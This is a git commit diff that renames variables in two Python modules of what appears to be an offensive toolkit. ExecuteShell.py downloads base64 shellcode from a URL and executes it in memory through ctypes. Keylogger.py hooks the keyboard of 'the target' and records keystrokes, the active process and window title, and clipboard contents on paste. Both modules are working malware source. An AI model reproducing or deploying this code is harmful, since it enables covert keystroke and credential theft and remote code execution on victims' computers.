924ea60fcf054e27682014519cb77feb3eff7c32
Alex Stocks <stocksalex@icloud.com>
2020-09-21 21:01:08 +0100

    Keylogger finished

--- modules/ExecuteShell.py
+++ modules/ExecuteShell.py
@@ -10,9 +10,9 @@ response = urllib3.PoolManager().urlopen(url)
 shellcode = base64.b64decode(response.read())
 
 # allocate buffer to hold shellcode after we have decoded it
-shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+shellcodeBuffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 
 # case the buffer to act as a function pointer
-shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+shellcodeFunction = ctypes.cast(shellcodeBuffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
 
-shellcode_func()
+shellcodeFunction()
--- modules/Keylogger.py
+++ modules/Keylogger.py
@@ -9,47 +9,47 @@ import win32clipboard
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
-current_window = None
+currentWindow = None
 
 
-def get_current_process():
+def getCurrentProcess():
     # get active window handle
-    hwnd = user32.GetForegroundWindow()
+    windowHandle = user32.GetForegroundWindow()
 
     # get process id
     pid = c_ulong(0)
 
     # pass handle to get pid
-    user32.GetWindowThreadProcessId(hwnd, byref(pid))
-    process_id = "%d" % pid.value
+    user32.GetWindowThreadProcessId(windowHandle, byref(pid))
+    processID = "%d" % pid.value
 
     executable = create_string_buffer("\x00" * 512)
 
-    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+    openedProcess = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
     # find the actual executable name of the process
-    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
+    psapi.GetModuleBaseNameA(openedProcess, None, byref(executable), 512)
 
     window_title = create_string_buffer("\x00" * 512)
 
     # grab full text of windows title bar
-    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
+    length = user32.GetWindowTextA(windowHandle, byref(window_title), 512)
 
     print("")
-    print("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
+    print("[PID: %s - %s - %s]" % (processID, executable.value, window_title.value))
     print("")
 
-    kernel32.CloseHandle(hwnd)
-    kernel32.CloseHandle(h_process)
+    kernel32.CloseHandle(windowHandle)
+    kernel32.CloseHandle(openedProcess)
 
 
-def KeyStroke(event):
-    global current_window
+def keyState(event):
+    global currentWindow
 
     # check if target changed windows
-    if event.WindowName != current_window:
-        current_window = event.WindowName
-        get_current_process()
+    if event.WindowName != currentWindow:
+        currentWindow = event.WindowName
+        getCurrentProcess()
 
     # if a standard key is pressed
     if 32 < event.Ascii < 127:
@@ -59,19 +59,19 @@ def KeyStroke(event):
         if event.Key == "V":
 
             win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
+            pastedValue = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print("[PASTE] - %s" % pasted_value)
+            print("[PASTE] - %s" % pastedValue)
         else:
             print("[%s]" % event.Key)
     return True
 
 
 kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+kl.KeyDown = keyState
 
-# whenever the target presses on the keyboard, keystroke function called with event object as parameter
+# whenever the target presses on the keyboard, keyState function called with event object as parameter
 kl.HookKeyboard()
 
 pythoncom.PumpMessages()
